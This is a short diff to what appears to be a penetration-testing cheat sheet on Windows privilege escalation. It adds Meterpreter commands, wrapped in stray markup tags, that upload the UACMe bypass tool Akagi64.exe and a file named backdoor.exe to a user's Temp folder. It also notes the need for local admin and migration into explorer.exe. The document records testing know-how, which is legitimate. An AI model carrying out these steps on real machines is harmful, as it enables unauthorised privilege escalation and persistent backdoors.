@@ -12,6 +12,15 @@
 	- eg. exploit/windows/local/ms16_014_wmi_recv_notif
 
 # UACBypass - UACMe 
+<mtlm>
+	<t1>- Commands:</t1>
+<p>:CTRL + C
+cd C:\\Users\\admin\\AppData\\Local\\Temp
+upload /root/Desktop/tools/UACME/Akagi64.exe .
+upload /root/backdoor.exe .
+ls
+</p>
+</mtlm>
 - need local admin account access
 - migrate process to explorer.exe 
 - pgrep explorer.exe OR ps -S explorer.exe
